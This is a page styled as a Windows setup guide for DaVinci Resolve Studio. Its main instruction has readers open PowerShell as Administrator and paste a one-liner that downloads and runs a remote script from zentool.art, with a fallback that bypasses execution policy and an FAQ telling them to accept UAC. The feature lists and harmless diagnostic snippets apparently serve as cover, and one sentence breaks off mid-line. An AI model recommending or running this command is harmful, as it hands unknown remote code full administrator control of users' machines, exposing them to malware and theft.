# DaVinci Resolve Studio — Windows Video Workflow Guide (10 & 11)

Windows 10 & 11 · timeline editing · video workflow.

**DaVinci Resolve Studio** on **Windows 10 and 11** — timeline editing and day-to-day notes for video editors and content creators.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **DaVinci Resolve Studio** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

DaVinci Resolve combines editing, Fusion compositing, Fairlight audio, and color grading in a single timeline on Windows workstations with capable GPUs. Studio-oriented builds add CODEC support and collaboration features teams expect for client delivery.

Workflow notes in

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- Timeline editing
- Effect presets
- Color tools
- Audio sync
- Export profiles
- Title packs
- Media bins

## Use cases

- Content creators
- Event editors
- Media classrooms

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "DaVinci-Resolve-Studio-Setup"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "Resolve*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 8 GB minimum · 16 GB recommended |
| Disk | 10 GB free space |

## Topics

`davinci-resolve-studio-windows` · `davinci-config` · `davinci-integration` · `davinci-latest` · `video-editing` · `color-grading` · `timeline-editing` · `media-workflow`

## License

This repository is a third-party video editing usage guide. Comply with applicable software licensing and local regulations.
